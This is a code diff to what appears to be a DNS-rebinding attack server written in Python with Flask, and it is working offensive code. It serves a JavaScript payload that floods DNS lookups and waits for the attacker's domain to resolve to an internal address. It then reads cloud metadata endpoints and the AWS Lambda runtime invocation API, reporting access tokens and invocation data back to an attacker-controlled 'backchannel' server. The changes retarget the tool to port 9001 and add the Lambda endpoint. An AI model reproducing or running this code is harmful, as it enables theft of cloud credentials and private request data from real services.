@@ -114,13 +114,13 @@ CORS(app)
 
 import logging
 log = logging.getLogger('werkzeug')
-log.setLevel(logging.INFO)
+log.setLevel(logging.ERROR)
 
 boilerplate = '''
 <img src="loaded">
 <script>
-var backchannelServer = 'bc.$BASE$';
-var attackServer = '$BASE$';
+var backchannelServer = 'bc.$BASE$:9001';
+var attackServer = '$BASE$:9001';
 
 function log(data) {
     var sreq = new XMLHttpRequest();
@@ -155,8 +155,8 @@ var dnsFlush = 2500;
 log('Flushing DNS');
 for(var i = 0; i < dnsFlush; ++i) {
     var req = reqs[i] = new XMLHttpRequest();
-    //req.open('GET', 'https://a' + i + '.ex.$BASE$/', true);
-    req.open('GET', 'https://a' + i + '.$BASE$/', true);
+    //req.open('GET', 'http://a' + i + attackServer + '/', true);
+    req.open('GET', 'http://a' + i + attackServer + '/', true);
     req.send(null);
 }
 while(true) {
@@ -282,35 +282,17 @@ log('Access token: ' + get('http://' + attackServer + '/computeMetadata/v1/insta
 
 lambdaCode = '''
 var invocationData;
-    // Define the endpoint to query the Lambda runtime API
-
-
-    // Send request to the local endpoint
-    for(var i = 0; i < 600; ++i) {
+for(var i = 0; i < 600; ++i) {
     var req = new XMLHttpRequest();
     req.open('GET', 'http://' + backchannelServer + '/wait', false);
     req.send();
-	
-	var invocationData = get('http://' + attackServer + ':9001/2018-06-01/runtime/invocation/next');
-
-    // Parse and log data from the response
-    var localData = localReq.responseText;
-    log('Local invocation data: ' + localData);
-
-    // Check if the data has changed to stop the loop
-    if (localData != 'still the same host') {
-        invocationData = {
-            local: localData
-        };
+	invocationData = get('http://' + attackServer + '/2018-06-01/runtime/invocation/next');
+    if (invocationData != 'still the same host') {
         break;
-    }
-}
-
-if (invocationData) {
-    log('Invocation Data:', JSON.stringify(invocationData, null, 2));
-} else {
-    log('No invocation data change detected after 600 attempts.');
-}
+        
+    }}
+    
+log('Local invocation data: ' + invocationData);
 '''
 
 @app.route('/')
@@ -367,6 +349,7 @@ def loaded():
 @app.route('/computeMetadata/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
 @app.route('/v2/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
 @app.route('/latest/api/token', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
+@app.route('/2018-06-01/runtime/invocation/next', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
 def nil(subpath=None):
     return 'still the same host'
 
@@ -376,7 +359,7 @@ def main():
     servers = [
         socketserver.ThreadingUDPServer(('', port), UDPRequestHandler).serve_forever,
         socketserver.ThreadingTCPServer(('', port), TCPRequestHandler).serve_forever,
-        lambda: app.run(host='0.0.0.0', port=80, debug=True, use_reloader=False)
+        lambda: app.run(host='0.0.0.0', port=9001, debug=True, use_reloader=False)
     ]
 
     for s in servers:
